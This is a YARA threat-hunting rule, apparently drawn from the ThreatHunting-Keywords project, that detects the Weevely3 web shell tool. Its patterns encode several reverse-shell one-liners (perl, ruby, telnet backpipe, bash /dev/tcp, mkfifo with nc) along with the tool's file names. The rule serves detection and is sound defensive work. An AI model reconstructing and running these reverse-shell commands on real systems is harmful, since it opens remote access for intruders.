rule rule_Weevely3_offensive_tool_keyword
{
    meta:
        description = "Detection patterns for the tool 'Weevely3' taken from the ThreatHunting-Keywords github project"
        author = "@mthcht"
        reference = "https://github.com/mthcht/ThreatHunting-Keywords"
        tool = "Weevely3"
        rule_category = "offensive_tool_keyword"

    strings:
                        $string1_Weevely3_offensive_tool_keyword = /\/reversetcp\.py/ nocase ascii wide
                        $string2_Weevely3_offensive_tool_keyword = /\/weevely\.py/ nocase ascii wide
                        $string3_Weevely3_offensive_tool_keyword = "epinna/weevely3" nocase ascii wide
                        $string4_Weevely3_offensive_tool_keyword = /perl\s\-e\s\'use\sSocket\;\$i\=\\"\$\{lhost\}\\"\;\$p\=\$\{port\}/ nocase ascii wide
                        $string5_Weevely3_offensive_tool_keyword = /rm\s\-rf\s\/tmp\/backpipe\;mknod\s\/tmp\/backpipe\sp\;telnet\s.{0,1000}\s0\<\/tmp\/backpipe/ nocase ascii wide
                        $string6_Weevely3_offensive_tool_keyword = /ruby\s\-rsocket\s\-e\'f\=TCPSocket\.open\(\\"\$\{lhost\}\\"\,\$\{port\}\)\.to_i/ nocase ascii wide
                        $string7_Weevely3_offensive_tool_keyword = /sleep\s1\;\s\/bin\/bash\s\-c\s\\\'\$\{shell\}\s0\<\/dev\/tcp\/\$\{lhost\}\/\$\{port\}\s1\>\&0\s2\>\&0/
                        $string8_Weevely3_offensive_tool_keyword = /sleep\s1\;\srm\s\-rf\s\/tmp\/f\;mkfifo\s\/tmp\/f\;cat\s\/tmp\/f\|\$\{shell\}\s\-i\s2\>\&1\|nc\s\$\{lhost\}\s\$\{port\}\s\>\/tmp\/f/ nocase ascii wide
                        $string9_Weevely3_offensive_tool_keyword = "weevely generate " nocase ascii wide

    condition:
        any of them
}